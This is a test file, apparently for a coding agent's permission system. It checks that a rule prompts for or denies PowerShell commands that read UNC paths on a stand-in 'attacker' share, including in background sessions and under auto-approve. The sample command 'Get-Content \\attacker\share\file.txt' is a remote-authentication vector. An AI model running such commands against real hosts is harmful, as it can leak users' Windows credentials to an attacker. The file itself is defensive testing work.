import { describe, expect, it, vi } from "vitest";

import { withPlatform } from "../testing/harness";
import { REMOTE_AUTH_VECTOR_RULE } from "./remote-authentication-vector-rule";
import { makeCtx, makeRequest } from "./test-helpers";

describe("REMOTE_AUTH_VECTOR_RULE", () => {
  it("returns null for non-shell requests", () => {
    const ctx = makeCtx();
    const request = makeRequest({
      kind: "mcp",
      toolName: "playwright-browser_navigate",
      serverName: "playwright",
      toolTitle: undefined,
      toolDescription: undefined,
      toolArgs: {},
      readOnly: false,
      toolCallId: undefined,
    });
    expect(REMOTE_AUTH_VECTOR_RULE.apply(request, ctx)).toBeNull();
  });

  it("returns null for safe shell commands", () => {
    const ctx = makeCtx();
    const request = makeRequest({ kind: "shell", command: "ls /tmp" });
    expect(REMOTE_AUTH_VECTOR_RULE.apply(request, ctx)).toBeNull();
  });

  it("returns prompt for foreground session with PowerShell remote auth vector", () => {
    withPlatform("win32", () => {
      const ctx = makeCtx({ sessionDenyPrompt: new Set() });
      // UNC path in PowerShell is a known remote auth vector
      const request = makeRequest({
        kind: "shell",
        command: "Get-Content \\\\attacker\\share\\file.txt",
      });
      const result = REMOTE_AUTH_VECTOR_RULE.apply(request, ctx);
      expect(result).not.toBeNull();
      expect(result?.decision).toBe("prompt");
      expect(result?.auditOutcome).toBe("denied");
    });
  });

  it("fires callback and denies for background session with PowerShell remote auth vector", () => {
    withPlatform("win32", () => {
      const callback = vi.fn<(sessionId: string, kind: string, detail: string) => void>();
      const ctx = makeCtx({
        sessionDenyPrompt: new Set(["s1"]),
        onDenyPromptCallback: callback,
      });
      const request = makeRequest({
        kind: "shell",
        command: "Get-Content \\\\attacker\\share\\file.txt",
        sessionId: "s1",
      });
      const result = REMOTE_AUTH_VECTOR_RULE.apply(request, ctx);
      expect(result).not.toBeNull();
      expect(result?.decision).toBe("deny");
      expect(callback).toHaveBeenCalledWith(
        "s1",
        "shell",
        "Get-Content \\\\attacker\\share\\file.txt",
      );
    });
  });

  it("fires even when serverConfig.autoApprove is true", () => {
    withPlatform("win32", () => {
      const ctx = makeCtx({
        serverConfig: { enabled: true, autoApprove: true },
        sessionDenyPrompt: new Set(),
      });
      const result = REMOTE_AUTH_VECTOR_RULE.apply(
        makeRequest({ kind: "shell", command: "Get-Content \\\\attacker\\share\\file" }),
        ctx,
      );
      expect(result?.decision).toBe("prompt");
    });
  });
});
